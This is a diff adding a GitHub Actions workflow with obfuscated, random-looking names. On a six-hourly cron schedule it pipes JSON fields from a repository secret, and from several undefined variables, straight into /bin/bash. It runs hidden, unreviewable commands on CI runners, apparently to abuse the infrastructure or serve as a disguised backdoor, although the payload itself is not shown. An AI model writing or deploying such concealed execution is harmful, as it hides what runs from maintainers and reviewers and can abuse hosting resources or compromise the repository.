@@ -1,0 +1,24 @@
+name: xiaozhangfu4715
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaozhangfu4715
+        env:
+          qghb99523: ${{ secrets.qghb99523 }}
+        run: |
+          echo $qghb99523 | jq -r .gz8 | /bin/bash
+          echo $jjuoa43 | jq -r .cuqwe323 | /bin/bash
+          echo $osv7471 | jq -r .bk8099 | /bin/bash
+          echo $npwwq01 | jq -r .v6 | /bin/bash
+          echo $jo5259 | jq -r .tdr77 | /bin/bash
+          echo $uzzwo5 | jq -r .hgel17566 | /bin/bash
+          echo $kukkt12273 | jq -r .kqp0198 | /bin/bash
+
